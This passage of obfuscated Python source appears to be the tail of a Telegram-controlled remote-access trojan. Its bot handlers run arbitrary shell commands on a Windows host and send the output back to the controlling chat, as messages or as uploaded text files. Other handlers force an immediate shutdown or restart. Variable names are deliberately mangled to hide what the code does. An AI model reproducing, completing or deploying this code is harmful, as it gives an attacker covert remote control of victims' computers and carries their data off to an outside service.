			OOO00O0O000OOO00O =B .popen (OO0O000O00O0O0000 ).read ();O000000O0OOO000OO =[OOO00O0O000OOO00O [OO00OOOOOOOOO0000 :OO00OOOOOOOOO0000 +U ]for OO00OOOOOOOOO0000 in V (0 ,G (OOO00O0O000OOO00O ),U )]#line:737
			if G (O000000O0OOO000OO )>1 :#line:738
				with F (X ,P ,encoding =W )as O00OOOO00000OOO00 :O00OOOO00000OOO00 .write (OOO00O0O000OOO00O );B .popen (Bk )#line:739
				with F (X ,K )as O0O00OOOO0OOOO000 :A .send_document (OOOOOOO0O0OOOOOO0 .chat .id ,O0O00OOOO0OOOO000 )#line:740
				B .remove (X )#line:741
			else :#line:742
				for OOO00O00O0O0OO0O0 in O000000O0OOO000OO :A .send_message (OOOOOOO0O0OOOOOO0 .chat .id ,f"Result:\n\n{OOO00O00O0O0OO0O0}")#line:743
	except C as OOOO0O00OOO00OO0O :A .send_message (OOOOOOO0O0OOOOOO0 .chat .id ,f"Error:\n\n{OOOO0O00OOO00OO0O}")#line:744
@A .message_handler (commands =['shutdown'])#line:745
def a (O0OOO0O0O000OOOO0 ):#line:746
	OOO0O0OO000OOOOOO =O0OOO0O0O000OOOO0 #line:747
	try :B .popen ('shutdown /s /f /t 0');A .send_message (OOO0O0OO000OOOOOO .chat .id ,'pc is shutdowned!')#line:748
	except C as O0OOO0O0O0OOOOO00 :A .send_message (OOO0O0OO000OOOOOO .chat .id ,f"Error:{O0OOO0O0O0OOOOO00}")#line:749
@A .message_handler (commands =['restart'])#line:750
def a (O0OOOO00OOOO00OO0 ):#line:751
	O0OOOOOOOO0O0OOOO =O0OOOO00OOOO00OO0 #line:752
	try :B .popen ('shutdown /r /f /t 0');A .send_message (O0OOOOOOOO0O0OOOO .chat .id ,'pc is restarted!')#line:753
	except C as O00000O000OO0OOOO :A .send_message (O0OOOOOOOO0O0OOOO .chat .id ,f"Error:{O00000O000OO0OOOO}")#line:754
@A .message_handler (commands =[Bh ])#line:755
def a (O00000O0OO0O00OOO ):#line:756
	OOO0000OO00OO0OOO ='_windows2_.txt';OOO00O0OO0O0O0OO0 =O00000O0OO0O00OOO #line:757
	try :#line:758
		O000OOOO000OOO0O0 =Bh ;O0OO000O0O000O00O =B .popen (O000OOOO000OOO0O0 ).read ();OO00O0O0O000OO000 =[O0OO000O0O000O00O [O0OOOO0OOOOO00O00 :O0OOOO0OOOOO00O00 +U ]for O0OOOO0OOOOO00O00 in V (0 ,G (O0OO000O0O000O00O ),U )]#line:759
		if G (OO00O0O0O000OO000 )>1 :#line:760
			with F (X ,P ,encoding =W )as OO00000O00O000OO0 :OO00000O00O000OO0 .write (O0OO000O0O000O00O );B .popen (Bk )#line:761
			with F (X ,K )as OOOOOO0O0OOOOO000 :A .send_document (OOO00O0OO0O0O0OO0 .chat .id ,OOOOOO0O0OOOOO000 )#line:762
			B .remove (X )#line:763
		O0OO000O0O000O00O =B .popen (CA ).read ().strip ();OO00O0O0O000OO000 =[O0OO000O0O000O00O [O0O0OOO0O0OO0O000 :O0O0OOO0O0OO0O000 +U ]for O0O0OOO0O0OO0O000 in V (0 ,G (O0OO000O0O000O00O ),U )]#line:764
		if G (OO00O0O0O000OO000 )>1 :#line:765
			with F (OOO0000OO00OO0OOO ,P ,encoding =W )as OO00000O00O000OO0 :OO00000O00O000OO0 .write (O0OO000O0O000O00O );B .popen (Bk )#line:766
			with F (OOO0000OO00OO0OOO ,K )as OOOOOO0O0OOOOO000 :A .send_document (OOO00O0OO0O0O0OO0 .chat .id ,OOOOOO0O0OOOOO000 )#line:767
			B .remove (OOO0000OO00OO0OOO )#line:768
		else :#line:769
			for OO0O000O0O00OOOOO in OO00O0O0O000OO000 :A .send_message (OOO00O0OO0O0O0OO0 .chat .id ,f"Result:\n\n{OO0O000O0O00OOOOO}")#line:770
	except C as OOOOOOOO0O00000OO :A .send_message (OOO00O0OO0O0O0OO0 .chat .id ,f"Error:\n\n{OOOOOOOO0O00000OO}")#line:771
if __name__ =='__main__':A .polling (none_stop =J )